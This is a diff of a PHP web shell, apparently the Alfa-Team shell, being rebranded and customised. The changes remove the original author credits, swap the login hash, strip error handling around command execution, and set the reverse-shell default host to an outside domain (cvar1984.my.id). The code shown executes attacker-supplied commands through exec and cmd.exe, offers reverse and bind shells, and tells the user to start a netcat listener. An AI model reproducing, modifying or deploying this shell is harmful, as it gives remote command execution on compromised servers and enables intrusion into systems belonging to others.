@@ -1,14 +1,8 @@
 <?php
-/*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'Cvar1984',
-    'password' => 'a612f595bfae116b349ef6ae1fd72ae3',
+    'password' => '9910219dad18a37d43febd91dfa016f5',
     'safe_mode' => '1',
     'login_page' => '404',
     'show_icons' => '1',
@@ -756,7 +750,6 @@ function alfaEx($in,$re=false,$cgi=true,$all=false){
 }
 function _alfa_php_cmd($in,$re=false){
 $out='';
-try{
 if($re)$in=$in." 2>&1";
 if(function_exists('exec')){
 @exec($in,$out);
@@ -788,7 +781,6 @@ $exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
 $stdout = $exec->StdOut();
 $out=$stdout->ReadAll();
 }
-}catch(Exception $e){}
 return $out;
 }
 function _alfa_fsockopen($server,$uri,$post){
@@ -3770,7 +3762,7 @@ echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,th
 <div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
 $cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
 foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
-echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
+echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">Host:</div> <input type='text' style='text-align:center;' name='server' value='cvar1984.my.id'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='1234'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
 if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
 $lang = $_POST['alfa1'];
 $ip = $_POST['alfa2'];
@@ -6510,9 +6502,4 @@ $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
-/*
-#Persian Gulf For Ever
-#skype : sole.sad
-#skype : ehsan.invisible
-*/
-?>
+__halt_compiler();
